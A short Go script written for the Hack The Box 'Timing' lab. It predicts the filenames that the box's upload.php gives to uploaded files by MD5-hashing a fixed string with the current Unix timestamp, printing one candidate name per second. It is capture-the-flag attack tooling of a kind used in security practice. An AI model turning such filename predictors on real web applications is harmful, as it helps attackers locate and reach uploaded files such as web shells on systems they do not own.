package main

// Script for hackthebox: timing
// Based on upload.php this script predicts the uploaded filename, provided a basename

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"time"
)

func main() {
    if len(os.Args) != 2 {
        fmt.Println("Usage: " + os.Args[0] + " <basename>")
        os.Exit(1)
    }
    basename := os.Args[1]      // Get uploaded file basename
    start := int(time.Now().Unix())  // Get the initial start unix time

    // increment i every second
    for i := start; true; i++ {
        // Convert i to a string
        now := strconv.Itoa(i)

        // Predict the filename according to upload.php
        file_name := md5sum("$file_hash"+now) + "_" + basename
        fmt.Println(file_name)

        time.Sleep(time.Second)
    }
}

// https://stackoverflow.com/questions/2377881/how-to-get-a-md5-hash-from-a-string-in-golang
func md5sum(text string) string {
    hash := md5.Sum([]byte(text))
    return hex.EncodeToString(hash[:])
}
